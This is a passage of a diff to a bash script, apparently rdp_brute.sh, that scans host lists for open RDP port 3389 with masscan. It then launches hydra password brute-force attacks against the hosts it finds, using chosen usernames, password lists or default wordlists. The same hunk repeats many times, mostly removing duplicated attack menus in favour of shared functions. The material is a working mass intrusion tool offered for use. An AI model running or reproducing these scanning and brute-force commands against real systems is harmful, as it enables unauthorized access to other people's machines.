-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20597,6 +8345,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20606,53 +8355,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20670,6 +8373,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20679,53 +8383,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20743,6 +8401,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20752,53 +8411,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20816,6 +8429,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20825,53 +8439,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20889,6 +8457,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20898,53 +8467,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20962,6 +8485,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20971,53 +8495,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21035,6 +8513,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21044,53 +8523,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21108,6 +8541,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21117,53 +8551,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21181,6 +8569,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21190,53 +8579,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21254,6 +8597,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21263,53 +8607,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21327,6 +8625,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21336,53 +8635,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21400,6 +8653,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21409,53 +8663,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21473,6 +8681,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21482,53 +8691,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21546,6 +8709,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21555,53 +8719,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -21619,6 +8737,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -21628,53 +8747,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
